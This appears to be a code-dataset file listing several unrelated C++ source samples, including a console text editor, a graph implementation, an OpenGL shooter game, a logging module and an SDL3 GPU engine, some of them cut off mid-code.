    "#include <iostream>\n#include <fstream>\n#include <vector>\n#include <string>\n#include <cstdlib>\n#include <conio.h>\n#include <chrono>\n#include <thread>\n\n#ifdef _WIN32\n#include <windows.h>\n#else\n#include <sys/ioctl.h>\n#include <unistd.h>\n#endif\n\nusing namespace std;\n\nint getTerminalHeight() {\n#ifdef _WIN32\n    CONSOLE_SCREEN_BUFFER_INFO csbi;\n    if (GetConsoleScreenBufferInfo(GetStdHandle(STD_OUTPUT_HANDLE), &csbi)) {\n        return csbi.srWindow.Bottom - csbi.srWindow.Top + 1;\n    }\n    return 25;\n#else\n    struct winsize w;\n    if (ioctl(STDOUT_FILENO, TIOCGWINSZ, &w) == 0) {\n        return w.ws_row;\n    }\n    return 25;\n#endif\n}\n\nint getTerminalWidth() {\n#ifdef _WIN32\n    CONSOLE_SCREEN_BUFFER_INFO csbi;\n    if (GetConsoleScreenBufferInfo(GetStdHandle(STD_OUTPUT_HANDLE), &csbi)) {\n        return csbi.srWindow.Right - csbi.srWindow.Left + 1;\n    }\n    return 80;\n#else\n    struct winsize w;\n    if (ioctl(STDOUT_FILENO, TIOCGWINSZ, &w) == 0) {\n        return w.ws_col;\n    }\n    return 80;\n#endif\n}\n\nvoid setCursorPosition(int x, int y) {\n    cout << \"\\033[\" << y + 1 << \";\" << x + 1 << \"H\";\n}\n\nvoid clearScreen() {\n    cout << \"\\033[2J\\033[H\";\n}\n\nvoid displayEditor(const vector<string>& lines, int cursorX, int cursorY, int& startLine, int terminalHeight, const string& message = \"\") {\n    clearScreen();\n    int visibleLines = terminalHeight - 5;\n\n    if (cursorY < startLine) {\n        startLine = cursorY;\n    } else if (cursorY >= startLine + visibleLines) {\n        startLine = cursorY - visibleLines + 1;\n    }\n\n    for (int i = startLine; i < startLine + visibleLines && i < (int)lines.size(); i++) {\n        cout << (i == cursorY ? \"> \" : \"  \") << lines[i] << endl;\n    }\n\n    for (int i = lines.size(); i < startLine + visibleLines; i++) {\n        cout << endl;\n    }\n\n    if (!message.empty()) {\n        int width = getTerminalWidth();\n        setCursorPosition((width - message.size()) / 2, terminalHeight - 5);\n        cout << \"\\033[33m\" << message << \"\\033[0m\";\n    }\n\n    int width = getTerminalWidth();\n    string horizontalLine(width, '-');\n    setCursorPosition(0, terminalHeight - 3);\n    cout << horizontalLine << endl;\n    cout << \"F1: Save | F2: Open | F3: New Line | F4: Delete Line | F5: Exit\" << endl;\n\n    string art = \"Happy Editing! (^_^)\";\n    int padding = (width - art.size()) / 2;\n    setCursorPosition(padding, terminalHeight - 1);\n    cout << art;\n\n    setCursorPosition(cursorX + 2, cursorY - startLine);\n}\n\nvoid saveFile(const string& filename, const vector<string>& lines, bool& isSaved) {\n    ofstream file(filename);\n    if (!file) {\n        cerr << \"Error: Unable to save file.\" << endl;\n        return;\n    }\n    for (const auto& line : lines) {\n        file << line << endl;\n    }\n    isSaved = true;\n}\n\nvoid loadFile(const string& filename, vector<string>& lines) {\n    ifstream file(filename);\n    if (!file) {\n        ofstream newFile(filename);\n        newFile.close();\n        return;\n    }\n\n    lines.clear();\n    string line;\n    while (getline(file, line)) {\n        lines.push_back(line);\n    }\n}\n\nint main(int argc, char* argv[]) {\n    if (argc != 2) {\n        cerr << \"Usage: \" << argv[0] << \" editor <file.txt>\" << endl;\n        return 1;\n    }\n\n    string filename = argv[1];\n    vector<string> lines(1, \"\");\n    int cursorX = 0, cursorY = 0;\n    int startLine = 0;\n    bool running = true;\n    bool isSaved = true;\n\n    loadFile(filename, lines);\n\n    while (running) {\n        int terminalHeight = getTerminalHeight();\n        displayEditor(lines, cursorX, cursorY, startLine, terminalHeight);\n\n        char key = _getch();\n\n        if (key == 0 || key == -32) {\n            key = _getch();\n            switch (key) {\n                case 59: \n                    saveFile(filename, lines, isSaved);\n                    displayEditor(lines, cursorX, cursorY, startLine, terminalHeight, \"File Saved!\");\n                    this_thread::sleep_for(chrono::milliseconds(1000));\n                    break;\n                case 60: \n                    loadFile(filename, lines);\n                    cursorX = 0;\n                    cursorY = 0;\n                    isSaved = true;\n                    break;\n                case 61: \n                    lines.insert(lines.begin() + cursorY + 1, \"\");\n                    cursorY++;\n                    cursorX = 0;\n                    isSaved = false;\n                    break;\n                case 62: \n                    if (!lines.empty()) {\n                        lines.erase(lines.begin() + cursorY);\n                        cursorY = max(0, cursorY - 1);\n                        if (lines.empty()) {\n                            lines.push_back(\"\");\n                        }\n                        isSaved = false;\n                    }\n                    break;\n                case 63: \n                    if (!isSaved) {\n                        displayEditor(lines, cursorX, cursorY, startLine, terminalHeight, \"Unsaved changes! Press F5 again to confirm exit.\");\n       ",
    "#include \"StudentManager.h\"\n#include <iostream>\n#include <exception>\n\nint main() {\n    StudentManager manager;\n\n    try {\n        // Generate random student files\n        manager.generateRandomStudents(\"students_10.txt\", 10);\n        manager.generateRandomStudents(\"students_100.txt\", 100);\n        manager.generateRandomStudents(\"students_1000.txt\", 1000);\n        manager.generateRandomStudents(\"students_10000.txt\", 10000);\n\n        // Load and sort students\n        manager.loadStudentsFromFile(\"students_100.txt\");\n        manager.sortStudents();\n\n        // Display sorted students\n        std::cout << \"Sorted Students:\\n\";\n        manager.displayStudents();\n\n        // Safe division example\n        int a = 10, b = 2; // Change b to a non-zero value\n        try {\n            double result = StudentManager::safeDivision(a, b);\n            std::cout << \"Result of division: \" << result << \"\\n\";\n        } catch (const std::exception& ex) {\n            std::cerr << \"Error during division: \" << ex.what() << \"\\n\";\n        }\n\n    } catch (const std::exception& ex) {\n        std::cerr << \"Exception: \" << ex.what() << \"\\n\";\n    }\n\n    return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"hotelbookingapp\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n\nconst int TAM = 100;\n\nusing namespace std;\n\nint vertices[TAM];\nint mat[TAM][TAM] = {0};\nint numVertices = 0;\n\nvoid inicia() {\n    for (int i = 0; i < TAM; ++i) {\n        for (int j = 0; j < TAM; ++j) {\n            mat[i][j] = 0;\n        }\n    }\n}\n\nbool haVertice(int valor) {\n    for (int i = 0; i < numVertices; ++i) {\n        if (vertices[i] == valor) {\n            return true;\n        }\n    }\n    return false;\n}\n\nvoid insereVertice(int valor) {\n    if (numVertices >= TAM) {\n        cout << \"N\u00e3o h\u00e1 espa\u00e7o!\" << endl;\n        return;\n    }\n\n    if (haVertice(valor)) {\n        cout << \"V\u00e9rtice repetido!\" << endl;\n        return;\n    }\n\n    vertices[numVertices] = valor;\n    ++numVertices;\n    cout << \"V\u00e9rtice inserido\" << endl;\n}\n\nvoid insereAresta(int origem, int destino) {\n    if (!haVertice(origem) || !haVertice(destino)) {\n        cout << \"Origem ou destino n\u00e3o existem!\" << endl;\n        return;\n    }\n\n    int i, j;\n\n    for (int k = 0; k < numVertices; ++k) {\n        if (vertices[k] == origem) {\n            i = k;\n        }\n        if (vertices[k] == destino) {\n            j = k;\n        }\n    }\n\n    if (mat[i][j] == 1) {\n        cout << \"Aresta repetida!\" << endl;\n        return;\n    }\n\n    mat[i][j] = 1;\n    cout << \"Aresta inserida!\" << endl;\n}\n\nvoid removeAresta(int origem, int destino) {\n    if (!haVertice(origem) || !haVertice(destino)) {\n        cout << \"Origem ou destino n\u00e3o existem!\" << endl;\n        return;\n    }\n\n    int i, j;\n\n    for (int k = 0; k < numVertices; ++k) {\n        if (vertices[k] == origem) {\n            i = k;\n        }\n        if (vertices[k] == destino) {\n            j = k;\n        }\n    }\n\n    if (mat[i][j] == 0) {\n        cout << \"Aresta n\u00e3o existe!\" << endl;\n        return;\n    }\n\n    mat[i][j] = 0;\n    cout << \"Aresta removida!\" << endl;\n}\n\nvoid imprime() {\n    for (int i = 0; i < numVertices; ++i) {\n        cout << vertices[i] << \" ->\";\n        for (int j = 0; j < TAM; ++j) {\n            if (mat[i][j] == 1) {\n                cout << \" <\" << vertices[i] << \",\" << vertices[j] << \">\";\n            }\n        }\n        cout << endl;\n    }\n}\n\nvoid inicializaGrafo() {\n    inicia();\n}\n",
    "#include <GL/glut.h>\n#include <cstdlib>    \n#include <cmath>\n#include <string>\n#include <vector>\n#include <algorithm>\n\n\n// Window dimensions\nconst int windowWidth = 800;\nconst int windowHeight = 600;\n\n// Player properties\nstruct Player {\n    float x = windowWidth / 2.0f;\n    float y = windowHeight - 50.0f;\n    float size = 20.0f;\n    float speed = 5.0f;\n} player;\n\n// Bullet properties\nstruct Bullet {\n    float x, y;\n    float speed = 7.0f;\n};\nstd::vector<Bullet> bullets;\n\n// Enemy properties\nstruct Enemy {\n    float x, y;\n    float size = 20.0f;\n    float speed = 2.0f;\n};\nstd::vector<Enemy> enemies;\n\n// Game state\nbool keys[256] = {false};\nint score = 0;\n\n// Initialize OpenGL\nvoid initOpenGL() {\n    glClearColor(0.0f, 0.0f, 0.0f, 1.0f);\n    glMatrixMode(GL_PROJECTION);\n    glLoadIdentity();\n    gluOrtho2D(0, windowWidth, 0, windowHeight);\n}\n\n// Draw a rectangle\nvoid drawRectangle(float x, float y, float width, float height, float r, float g, float b) {\n    glColor3f(r, g, b);\n    glBegin(GL_QUADS);\n    glVertex2f(x - width / 2, y - height / 2);\n    glVertex2f(x + width / 2, y - height / 2);\n    glVertex2f(x + width / 2, y + height / 2);\n    glVertex2f(x - width / 2, y + height / 2);\n    glEnd();\n}\n\n// Display function\nvoid display() {\n    glClear(GL_COLOR_BUFFER_BIT);\n\n    // Draw player\n    drawRectangle(player.x, player.y, player.size, player.size, 0.0f, 1.0f, 0.0f);\n\n    // Draw bullets\n    for (const auto& bullet : bullets) {\n        drawRectangle(bullet.x, bullet.y, 5, 10, 1.0f, 1.0f, 0.0f);\n    }\n\n    // Draw enemies\n    for (const auto& enemy : enemies) {\n        drawRectangle(enemy.x, enemy.y, enemy.size, enemy.size, 1.0f, 0.0f, 0.0f);\n    }\n\n    // Display score\n    glColor3f(1.0f, 1.0f, 1.0f);\n    glRasterPos2f(10, windowHeight - 20);\n    std::string scoreText = \"Score: \" + std::to_string(score);\n    for (char c : scoreText) {\n        glutBitmapCharacter(GLUT_BITMAP_8_BY_13, c);\n    }\n\n    glutSwapBuffers();\n}\n\n// Update game state\nvoid update(int value) {\n    // Move player\n    if (keys['a'] && player.x - player.size / 2 > 0) player.x -= player.speed;\n    if (keys['d'] && player.x + player.size / 2 < windowWidth) player.x += player.speed;\n    if (keys['w'] && player.y + player.size / 2 < windowHeight) player.y += player.speed;\n    if (keys['s'] && player.y - player.size / 2 > 0) player.y -= player.speed;\n\n    // Move bullets\n    for (auto& bullet : bullets) {\n        bullet.y += bullet.speed;\n    }\n    bullets.erase(std::remove_if(bullets.begin(), bullets.end(), [](const Bullet& b) {\n        return b.y > windowHeight;\n    }), bullets.end());\n\n    // Move enemies\n    for (auto& enemy : enemies) {\n        enemy.y -= enemy.speed;\n    }\n    enemies.erase(std::remove_if(enemies.begin(), enemies.end(), [](const Enemy& e) {\n        return e.y < 0;\n    }), enemies.end());\n\n    // Check for collisions\n    for (auto bulletIt = bullets.begin(); bulletIt != bullets.end(); ) {\n        bool bulletRemoved = false;\n        for (auto enemyIt = enemies.begin(); enemyIt != enemies.end(); ) {\n            float dx = bulletIt->x - enemyIt->x;\n            float dy = bulletIt->y - enemyIt->y;\n            float distance = std::sqrt(dx * dx + dy * dy);\n            if (distance < enemyIt->size / 2) {\n                enemyIt = enemies.erase(enemyIt);\n                bulletIt = bullets.erase(bulletIt);\n                bulletRemoved = true;\n                score += 10;\n                break;\n            } else {\n                ++enemyIt;\n            }\n        }\n        if (!bulletRemoved) {\n            ++bulletIt;\n        }\n    }\n\n    // Spawn enemies\n    if (rand() % 100 < 5) {\n        Enemy enemy;\n        enemy.x = rand() % windowWidth;\n        enemy.y = windowHeight;\n        enemies.push_back(enemy);\n    }\n\n    glutPostRedisplay();\n    glutTimerFunc(16, update, 0);\n}\n\n// Keyboard handling\nvoid keyboardDown(unsigned char key, int x, int y) {\n    keys[key] = true;\n    if (key == ' ') {\n        Bullet bullet;\n        bullet.x = player.x;\n        bullet.y = player.y + player.size / 2;\n        bullets.push_back(bullet);\n    }\n}\n\nvoid keyboardUp(unsigned char key, int x, int y) {\n    keys[key] = false;\n}\n\nint main(int argc, char** argv) {\n    glutInit(&argc, argv);\n    glutInitDisplayMode(GLUT_DOUBLE | GLUT_RGB);\n    glutInitWindowSize(windowWidth, windowHeight);\n    glutCreateWindow(\"Top-Down Shooter\");\n\n    initOpenGL();\n\n    glutDisplayFunc(display);\n    glutKeyboardFunc(keyboardDown);\n    glutKeyboardUpFunc(keyboardUp);\n    glutTimerFunc(16, update, 0);\n\n    glutMainLoop();\n    return 0;\n}\n\n",
    "#include \"Bamboo/Components/Rigidbody2DComponent.hpp\"\n#include \"Panda/OuterScriptHook.hpp\"\n\nnamespace Bamboo {\n\nvoid Rigidbody2DComponent::applyForce(Vec2 force) {\n    Panda::EntityHandle entityHandle = getEntity().getId();\n    Panda::ExternalCalls::rigidbody2DComponent_applyForce(entityHandle, force.x, force.y);\n}\n\nvoid Rigidbody2DComponent::applyLinearImpulse(Vec2 impulse) {\n    Panda::EntityHandle entityHandle = getEntity().getId();\n    Panda::ExternalCalls::rigidbody2DComponent_applyLinearImpulse(\n        entityHandle, impulse.x, impulse.y\n    );\n}\n\nVec2 Rigidbody2DComponent::getLinearVelocity() {\n    Panda::EntityHandle entityHandle = getEntity().getId();\n    Vec2 result;\n    Panda::ExternalCalls::rigidbody2DComponent_getLinearVelocity(\n        entityHandle, &result.x, &result.y\n    );\n    return result;\n}\n\nvoid Rigidbody2DComponent::setLinearVelocity(Vec2 velocity) {\n    Panda::EntityHandle entityHandle = getEntity().getId();\n    Panda::ExternalCalls::rigidbody2DComponent_setLinearVelocity(\n        entityHandle, velocity.x, velocity.y\n    );\n}\n\nfloat Rigidbody2DComponent::getMass() {\n    Panda::EntityHandle entityHandle = getEntity().getId();\n    float mass;\n    Panda::ExternalCalls::rigidbody2DComponent_getMass(entityHandle, &mass);\n    return mass;\n}\n\nfloat Rigidbody2DComponent::getFriction() {\n    Panda::EntityHandle entityHandle = getEntity().getId();\n    float friction;\n    Panda::ExternalCalls::rigidbody2DComponent_getFriction(entityHandle, &friction);\n    return friction;\n}\n\nvoid Rigidbody2DComponent::setFriction(float friction) {\n    Panda::EntityHandle entityHandle = getEntity().getId();\n    Panda::ExternalCalls::rigidbody2DComponent_setFriction(entityHandle, friction);\n}\n\n} // namespace Bamboo\n",
    "#include \"log.h\"\n\n#include <condition_variable>\n#include <cstdarg>\n#include <cstdio>\n#include <mutex>\n#include <sstream>\n#include <thread>\n#include <vector>\n\nint common_log_verbosity_thold = LOG_DEFAULT_LLAMA;\n\nvoid common_log_set_verbosity_thold(int verbosity) {\n    common_log_verbosity_thold = verbosity;\n}\n\n#define LOG_COL_DEFAULT \"\\033[0m\"\n#define LOG_COL_BOLD    \"\\033[1m\"\n#define LOG_COL_RED     \"\\033[31m\"\n#define LOG_COL_GREEN   \"\\033[32m\"\n#define LOG_COL_YELLOW  \"\\033[33m\"\n#define LOG_COL_BLUE    \"\\033[34m\"\n#define LOG_COL_MAGENTA \"\\033[35m\"\n#define LOG_COL_CYAN    \"\\033[36m\"\n#define LOG_COL_WHITE   \"\\033[37m\"\n\nstatic int64_t t_us() {\n    return std::chrono::duration_cast<std::chrono::microseconds>(std::chrono::system_clock::now().time_since_epoch()).count();\n}\n\n// colors\nenum common_log_col : int {\n    COMMON_LOG_COL_DEFAULT = 0,\n    COMMON_LOG_COL_BOLD,\n    COMMON_LOG_COL_RED,\n    COMMON_LOG_COL_GREEN,\n    COMMON_LOG_COL_YELLOW,\n    COMMON_LOG_COL_BLUE,\n    COMMON_LOG_COL_MAGENTA,\n    COMMON_LOG_COL_CYAN,\n    COMMON_LOG_COL_WHITE,\n};\n\n// disable colors by default\nstatic std::vector<const char *> g_col = {\n    \"\",\n    \"\",\n    \"\",\n    \"\",\n    \"\",\n    \"\",\n    \"\",\n    \"\",\n    \"\",\n};\n\nstruct common_log_entry {\n    enum ggml_log_level level;\n\n    bool prefix;\n\n    int64_t timestamp;\n\n    std::vector<char> msg;\n\n    // signals the worker thread to stop\n    bool is_end;\n\n    void print(FILE * file = nullptr) const {\n        FILE * fcur = file;\n        if (!fcur) {\n            // stderr displays DBG messages only when their verbosity level is not higher than the threshold\n            // these messages will still be logged to a file\n            if (level == GGML_LOG_LEVEL_DEBUG && common_log_verbosity_thold < LOG_DEFAULT_DEBUG) {\n                return;\n            }\n\n            fcur = stdout;\n\n            if (level != GGML_LOG_LEVEL_NONE) {\n                fcur = stderr;\n            }\n        }\n\n        if (level != GGML_LOG_LEVEL_NONE && level != GGML_LOG_LEVEL_CONT && prefix) {\n            if (timestamp) {\n                // [M.s.ms.us]\n                fprintf(fcur, \"%s%d.%02d.%03d.%03d%s \",\n                        g_col[COMMON_LOG_COL_BLUE],\n                        (int) (timestamp / 1000000 / 60),\n                        (int) (timestamp / 1000000 % 60),\n                        (int) (timestamp / 1000 % 1000),\n                        (int) (timestamp % 1000),\n                        g_col[COMMON_LOG_COL_DEFAULT]);\n            }\n\n            switch (level) {\n                case GGML_LOG_LEVEL_INFO:  fprintf(fcur, \"%sI %s\", g_col[COMMON_LOG_COL_GREEN],   g_col[COMMON_LOG_COL_DEFAULT]); break;\n                case GGML_LOG_LEVEL_WARN:  fprintf(fcur, \"%sW %s\", g_col[COMMON_LOG_COL_MAGENTA], \"\"                        ); break;\n                case GGML_LOG_LEVEL_ERROR: fprintf(fcur, \"%sE %s\", g_col[COMMON_LOG_COL_RED],     \"\"                        ); break;\n                case GGML_LOG_LEVEL_DEBUG: fprintf(fcur, \"%sD %s\", g_col[COMMON_LOG_COL_YELLOW],  \"\"                        ); break;\n                default:\n                    break;\n            }\n        }\n\n        fprintf(fcur, \"%s\", msg.data());\n\n        if (level == GGML_LOG_LEVEL_WARN || level == GGML_LOG_LEVEL_ERROR || level == GGML_LOG_LEVEL_DEBUG) {\n            fprintf(fcur, \"%s\", g_col[COMMON_LOG_COL_DEFAULT]);\n        }\n\n        fflush(fcur);\n    }\n};\n\nstruct common_log {\n    // default capacity - will be expanded if needed\n    common_log() : common_log(256) {}\n\n    common_log(size_t capacity) {\n        file = nullptr;\n        prefix = false;\n        timestamps = false;\n        running = false;\n        t_start = t_us();\n\n        // initial message size - will be expanded if longer messages arrive\n        entries.resize(capacity);\n        for (auto & entry : entries) {\n            entry.msg.resize(256);\n        }\n\n        head = 0;\n        tail = 0;\n\n        resume();\n    }\n\n    ~common_log() {\n        pause();\n        if (file) {\n            fclose(file);\n        }\n    }\n\nprivate:\n    std::mutex mtx;\n    std::thread thrd;\n    std::condition_variable cv;\n\n    FILE * file;\n\n    bool prefix;\n    bool timestamps;\n    bool running;\n\n    int64_t t_start;\n\n    // ring buffer of entries\n    std::vector<common_log_entry> entries;\n    size_t head;\n    size_t tail;\n\n    // worker thread copies into this\n    common_log_entry cur;\n\npublic:\n    void add(enum ggml_log_level level, const char * fmt, va_list args) {\n        std::lock_guard<std::mutex> lock(mtx);\n\n        if (!running) {\n            // discard messages while the worker thread is paused\n            return;\n        }\n\n        auto & entry = entries[tail];\n\n        {\n            // cannot use args twice, so make a copy in case we need to expand the buffer\n            va_list args_copy;\n            va_copy(args_copy, args);\n\n#if 1\n            const size_t n = vsnprintf(entry.msg.data(), entry.msg.size(), fmt, args);\n            if (n >= entry.msg.size()) {\n                entry.msg.resize(n + 1)",
    "/*   This software is called MLIP for Machine Learning Interatomic Potentials.\n *   MLIP can only be used for non-commercial research and cannot be re-distributed.\n *   The use of MLIP must be acknowledged by citing approriate references.\n *   See the LICENSE file for details.\n */\n\n#include \"../../src/control_unit.h\"\n          \n\nusing namespace std;\n\n\nvoid Relax(Relaxation* p_rlx1, Relaxation* p_rlx2, Configuration& cfg, double pot_change_treshold)\n{\n\tstatic int strct_cntr = 1;\n\n\tcout << \"Relaxation structure#\" << strct_cntr\n\t\t<< \" with \" << cfg.size() << \" atoms\";\n\tif (p_rlx2 != nullptr)\n\t\tcout << \" by rough potential. \";\n\telse\n\t\tcout << \". \";\n\tcout.flush();\n\n\tp_rlx1->cfg = cfg;\n\tp_rlx1->Run();\n\tcfg = p_rlx1->cfg;\n\tcout << \"Energy after relaxation: \" << cfg.energy << \", status: \" << cfg.features[\"from\"];\n\tcout.flush();\n\n\tif (p_rlx2 != nullptr && cfg.energy/cfg.size() < pot_change_treshold)\n\t{\n\t\tp_rlx2->struct_cntr = p_rlx1->struct_cntr;\n\t\tcout << \"\\nContinue relaxation structure#\"<< strct_cntr << \" by fine potential. \";\n\t\tp_rlx2->cfg = cfg;\n\t\tp_rlx2->Run();\n\t\tcfg = p_rlx2->cfg;\n\t\tcout << \"Energy after relaxation: \" << cfg.energy;\n\t}\n\tcout << endl;\n}\n\n\nint main(int argc, char* argv[])\n{\n\ttry\n\t{\n\t\tif (argc == 0)\n\t\t\tERROR(\"wrong argument count\");\n\n\t\tint pop_size = stoi(argv[1]);\n\n\t\tControlUnit cu1(\"MLIP-settings.ini\", true);\n\t\tControlUnit cu2(\"MLIP-settings_fine.ini\", true);\n\t\tRelaxation* p_rlx1 = (Relaxation*)cu1.p_driver;\n\t\tRelaxation* p_rlx2 = (Relaxation*)cu2.p_driver;\n\n\t\tif (p_rlx1==nullptr)\n\t\t\tERROR(\"Relaxation is not initialized\");\n//\t\tif (p_rlx2==nullptr)\n//\t\t\tp_rlx2->SetLogStream(p_rlx1->GetLogStream());\n\n\t\tfor (int i=1; i<=pop_size; i++)\n\t\t{\n\t\t\tstring fnm = to_string(i) + \".cfg\";\n\t\t\tif (system((\"mv for_relax/\" + fnm + \" temp/\" + fnm).c_str()) == 0)\n\t\t\t{\n\t\t\t\tMessage(\"Reading structures from \" + fnm);\n\t\t\t\tifstream ifs(\"temp/\" + fnm);\n\t\t\t\tConfiguration cfg;\n\t\t\t\twhile (cfg.Load(ifs))\n\t\t\t\t{\n\t\t\t\t\tif (cfg.features.count(\"pressure\") == 0)\n\t\t\t\t\t\tcfg.features[\"pressure\"] = \"0\";\n\t\t\t\t\tp_rlx1->pressure = stod(cfg.features[\"pressure\"]);\n\t\t\t\t\tif (p_rlx2 != nullptr)\n\t\t\t\t\t\tp_rlx2->pressure = stod(cfg.features[\"pressure\"]);\n\t\t\t\t\tRelax(p_rlx1, p_rlx2, cfg, stod(cu1.settings[\"USPEX_PotChangeTreshold\"]));\n\t\t\t\t\tcfg.CorrectSupercell();\n\t\t\t\t\tsystem((\"rm -f relaxed/\" + fnm).c_str());\n\t\t\t\t\t//cfg.features.erase(\"pressure\");\n\t\t\t\t\tcfg.AppendToFile(\"relaxed/\" + fnm);\n\t\t\t\t\tsystem((\"rm -f temp/\" + fnm).c_str());\n\t\t\t\t\tMessage(\"Relaxed structure saved to \" + fnm);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\tcatch (MlipException& ex)\n\t{\n\t\tcout << ex.What() << endl;\n\t\tcerr << ex.What() << endl;\n\t\treturn 1;\n\t}\n}\n\n",
    "#include <array>\n#include <filesystem>\n#include <vector>\n#include <SDL3/SDL.h>\n#include <print>\n#include <span>\n#include <glm/glm.hpp>\n#include <string>\n#include <stdexcept>\n#include <fstream>\n#include <SDL3_image/SDL_image.h>\n\n#include \"assimp/Importer.hpp\"\n#include \"assimp/postprocess.h\"\n#include \"assimp/scene.h\"\n#include \"glm/ext/matrix_clip_space.hpp\"\n#include \"glm/ext/matrix_transform.hpp\"\n\nstatic std::filesystem::path BasePath;\n\nclass SDLException final : public std::runtime_error {\npublic:\n\texplicit SDLException(const std::string &message) : std::runtime_error(message + '\\n' + SDL_GetError()) {\n\t}\n};\n\nSDL_GPUShader *LoadShader(\n\tSDL_GPUDevice *device,\n\tconst std::string &shaderFilename,\n\tconst Uint32 samplerCount,\n\tconst Uint32 uniformBufferCount,\n\tconst Uint32 storageBufferCount,\n\tconst Uint32 storageTextureCount\n) {\n\tSDL_GPUShaderStage stage;\n\tif (shaderFilename.contains(\".vert\"))\n\t\tstage = SDL_GPU_SHADERSTAGE_VERTEX;\n\telse if (shaderFilename.contains(\".frag\"))\n\t\tstage = SDL_GPU_SHADERSTAGE_FRAGMENT;\n\telse\n\t\tthrow std::runtime_error{\"Unrecognized shader stage!\"};\n\n\tstd::filesystem::path fullPath;\n\tconst SDL_GPUShaderFormat backendFormats{SDL_GetGPUShaderFormats(device)};\n\tSDL_GPUShaderFormat format{};\n\tstd::string entrypoint{\"main\"};\n\n\tif (backendFormats & SDL_GPU_SHADERFORMAT_SPIRV) {\n\t\tfullPath = BasePath / \"Content/Shaders/Compiled/SPIRV\" / (shaderFilename + \".spv\");\n\t\tformat = SDL_GPU_SHADERFORMAT_SPIRV;\n\t} else if (backendFormats & SDL_GPU_SHADERFORMAT_MSL) {\n\t\tfullPath = BasePath / \"Content/Shaders/Compiled/MSL\" / (shaderFilename + \".msl\");\n\t\tformat = SDL_GPU_SHADERFORMAT_MSL;\n\t\tentrypoint = \"main0\";\n\t} else if (backendFormats & SDL_GPU_SHADERFORMAT_DXIL) {\n\t\tfullPath = BasePath / \"Content/Shaders/Compiled/DXIL\" / (shaderFilename + \".dxil\");\n\t\tformat = SDL_GPU_SHADERFORMAT_DXIL;\n\t} else throw std::runtime_error{\"No supported shader formats available\"};\n\n\tstd::ifstream file{fullPath, std::ios::binary};\n\tif (!file)\n\t\tthrow std::runtime_error{\"Couldn't open shader file\"};\n\tstd::vector<Uint8> code{std::istreambuf_iterator(file), {}};\n\n\tconst SDL_GPUShaderCreateInfo shaderInfo{\n\t\t.code_size = code.size(),\n\t\t.code = code.data(),\n\t\t.entrypoint = entrypoint.c_str(),\n\t\t.format = format,\n\t\t.stage = stage,\n\t\t.num_samplers = samplerCount,\n\t\t.num_storage_textures = storageTextureCount,\n\t\t.num_storage_buffers = storageBufferCount,\n\t\t.num_uniform_buffers = uniformBufferCount\n\t};\n\n\treturn SDL_CreateGPUShader(device, &shaderInfo);\n}\n\nSDL_Surface *LoadImage(const std::string_view imageFilename, const int desiredChannels) {\n\tconst auto fullPath{BasePath / \"Content/Images\" / imageFilename};\n\tSDL_PixelFormat format;\n\n\tauto result{IMG_Load(fullPath.string().c_str())};\n\tif (!result)\n\t\tthrow SDLException{\"Couldn't load image\"};\n\n\tif (desiredChannels == 4)\n\t\tformat = SDL_PIXELFORMAT_ABGR8888;\n\telse {\n\t\tSDL_DestroySurface(result);\n\t\tthrow std::runtime_error{\"Unsupported number of channels\"};\n\t}\n\tif (result->format != format) {\n\t\tSDL_Surface *next = SDL_ConvertSurface(result, format);\n\t\tSDL_DestroySurface(result);\n\t\tresult = next;\n\t}\n\n\treturn result;\n}\n\n\nstruct Vertex {\n\tglm::vec3 position;\n\tglm::vec2 uv;\n};\n\nint main() {\n\tif (!SDL_Init(SDL_INIT_VIDEO))\n\t\tthrow SDLException{\"Couldn't initialize SDL\"};\n\n\tBasePath = SDL_GetBasePath();\n\n\tauto window{SDL_CreateWindow(\"Codotaku Game Engine\", 800, 600, SDL_WINDOW_HIDDEN | SDL_WINDOW_RESIZABLE)};\n\tif (!window)\n\t\tthrow SDLException{\"Couldn't create window\"};\n\n\tauto device{\n\t\tSDL_CreateGPUDevice(SDL_GPU_SHADERFORMAT_SPIRV | SDL_GPU_SHADERFORMAT_MSL | SDL_GPU_SHADERFORMAT_DXIL, true,\n\t\t                    nullptr)\n\t};\n\tif (!device)\n\t\tthrow SDLException{\"Couldn't create GPU device\"};\n\n\tstd::println(\"Using GPU device driver: {}\", SDL_GetGPUDeviceDriver(device));\n\n\tif (!SDL_ClaimWindowForGPUDevice(device, window))\n\t\tthrow SDLException{\"Couldn't claim window for GPU device\"};\n\n\n\tSDL_GPUTextureFormat depthStencilFormat;\n\n\tif (SDL_GPUTextureSupportsFormat(\n\t\tdevice,\n\t\tSDL_GPU_TEXTUREFORMAT_D24_UNORM_S8_UINT,\n\t\tSDL_GPU_TEXTURETYPE_2D,\n\t\tSDL_GPU_TEXTUREUSAGE_DEPTH_STENCIL_TARGET\n\t))\n\t\tdepthStencilFormat = SDL_GPU_TEXTUREFORMAT_D24_UNORM_S8_UINT;\n\telse if (SDL_GPUTextureSupportsFormat(\n\t\tdevice,\n\t\tSDL_GPU_TEXTUREFORMAT_D32_FLOAT_S8_UINT,\n\t\tSDL_GPU_TEXTURETYPE_2D,\n\t\tSDL_GPU_TEXTUREUSAGE_DEPTH_STENCIL_TARGET\n\t))\n\t\tdepthStencilFormat = 